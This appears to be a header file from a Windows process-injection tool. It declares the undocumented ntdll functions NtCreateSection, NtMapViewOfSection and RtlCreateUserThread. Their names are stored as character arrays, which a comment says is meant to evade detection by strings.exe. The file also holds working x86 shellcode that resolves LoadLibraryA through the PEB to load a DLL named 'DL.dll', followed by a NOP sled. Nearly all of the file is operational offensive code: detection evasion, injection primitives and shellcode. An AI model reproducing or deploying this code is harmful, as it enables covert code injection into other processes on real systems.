///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  Copyright © Aviv Shabtay 2020, All rights reserved
//
// THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
// ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO
// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
// PARTICULAR PURPOSE.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#pragma once
// Useful macros:
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NT_ERROR(Status)   ((((ULONG)(Status)) >> 30) == 3)
#define __FILENAME__ (strrchr(__FILE__, '/') ? strrchr(__FILE__, '/') + 1 : __FILE__)

// Using array of char to avoid Sysinternals strings.exe detection:
const TCHAR ntdll[] = { 'n', 't', 'd', 'l', 'l', 0 };
const TCHAR ntCreateSection[] = { 'N','t','C','r','e','a','t','e','S','e','c','t','i','o','n', 0 };
const TCHAR ntMapViewOfSection[] = { 'N','t','M','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n', 0 };
const TCHAR rtlCreateUserThread[] = { 'R','t','l','C','r','e','a','t','e','U','s','e','r','T','h','r','e','a','d', 0 };

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(WINAPI* pNtCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
	);

typedef NTSTATUS(WINAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);

typedef NTSTATUS(WINAPI* pRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientID
	);

/*
 * My own shellcode for loading DL.dll :-)
 * You can find the full assembly implementation in the Shellcode project in this solution.
*/
const char* shellcode = \
"\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x03\xd3"
"\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33\xc9\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75"
"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x03"
"\xf3\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x03\xf3\x8b\x14\x8e\x03\xd3\x33\xc9\x53\x52\x51\x68\x61"
"\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x51"
"\x66\xb9\x6c\x6c\x51\x68\x44\x4c\x2e\x64\x54\xff\xd0\x83\xc4\x10\x33\xc9\x5a\x5d\x66\xb9\x61"
"\x64\x51\x68\x54\x68\x72\x65\x68\x45\x78\x69\x74\x54\x53\xff\xd2\x83\xc4\x0c\x33\xc9\x51\xff"
"\xd0\x5e\x5b\x5d\xc3";

const char* nopSled = \
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";